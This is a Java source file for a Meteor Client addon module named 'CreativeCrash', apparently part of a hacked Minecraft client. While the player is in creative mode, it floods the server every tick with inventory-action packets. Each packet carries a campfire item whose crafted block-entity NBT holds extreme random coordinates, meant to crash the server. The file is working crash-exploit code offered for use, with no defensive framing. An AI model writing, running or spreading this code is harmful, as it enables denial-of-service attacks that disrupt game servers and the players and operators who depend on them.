package com.crystaldevs.crystal.modules.crash;

import com.crystaldevs.crystal.CrystalAddon;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtDouble;
import net.minecraft.nbt.NbtList;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

public class CreativeCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("Packets per tick")
            .defaultValue(15)
            .min(1)
            .sliderMax(100)
            .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("auto-disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build()
    );

    private final Random random = new Random();

    public CreativeCrash() {
        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY, "creative-crash", "CRYSTAL || Tries crashing the game while in Creative Mode.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!mc.player.getAbilities().creativeMode) {
            error("You must be in creative mode to use this.");
            toggle();
            return;
        }
        NbtList list = new NbtList();
        list.add(NbtDouble.of(pickRandomPos().x));
        list.add(NbtDouble.of(pickRandomPos().y));
        list.add(NbtDouble.of(pickRandomPos().z));

        NbtCompound tag = new NbtCompound();
        tag.put("Pos", list);

        ItemStack stack = new ItemStack(Items.CAMPFIRE);
        stack.setSubNbt("BlockEntityTag", tag);

        for (int i = 0; i < amount.get(); i++)
            mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(1, stack));
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    private Vec3d pickRandomPos() {
        int x = random.nextInt(16777215);
        int y = 255;
        int z = random.nextInt(16777215);
        return new Vec3d(x, y, z);
    }
}